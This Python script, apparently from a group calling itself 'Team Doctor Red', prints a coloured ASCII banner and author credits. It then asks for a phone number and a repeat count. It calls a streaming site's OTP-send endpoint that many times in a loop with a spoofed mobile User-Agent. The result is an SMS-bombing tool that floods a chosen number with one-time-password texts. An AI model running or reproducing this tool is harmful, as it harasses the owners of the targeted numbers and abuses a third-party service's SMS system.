import sys
import time 
def animated(text):
  for x in text:
    sys.stdout.write(x)
    sys.stdout.flush()
    time.sleep(0.005)
logo = '''
                     \x1b[38;5;197m.-*=*=+:                
                    :+=    -+: . :           
              =+*++=*=     -+..:=::=.        
             .*#%%%%%%#+=. ++ ..=======-     
        .=*%@%%%%%%%%%%##= ++:.-=----=-      
      -#@%%%%%%%%%%%%%%%%=  :::-==--=-:::    
    .#%%%%%%%%%%%%%%%%%%%%%:   :.==:==  .    
   .%%%%%%%%%%%%%%%%%%%%%%#@=    -   ..      
   #%%*%%%%%%%%%%%%%%%%%%%##@:               
  .@%**#%%%%%%%%%%%%%%%%%%%*@#               
  .@%*+*%%%%%%%%%%%%%%%%%%%#@%               
   *%#++*%%%%%%%%%%%%%%%%%%%%*               
   .%%#*+*%%%%%%%%%%%%%%%%%%%.               
    .#%%#*+#%%%%%%%%%%%%%%%%:                
      -#%%%###%%%%%%%%%%%%+                  
        :+#%%%%%%%%%%%%*-                    
            :-==++==:.        
 '''
name = '''
      \x1b[38;5;41m  Team     : Team Doctor Red 
        Author   : Mohammad Sagor 
        Facebook : https://www.facebook.com/profile.php?id=100090980307287&mibextid=ZbWKwL
'''
line = '\x1b[38;5;220m....................................................................\n'

animated(logo)
animated(line)
animated(name)
animated(line)

# Example:

import requests

#GET
c=requests.Session()
number=str(input('enter your number :'))

api='https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp'
ua={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1; A1603 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
amount=int(input('enter your amount: '))

for i in range(amount):
 b=c.get(api, headers=ua)
 print(str(i+1)+'sms sent')





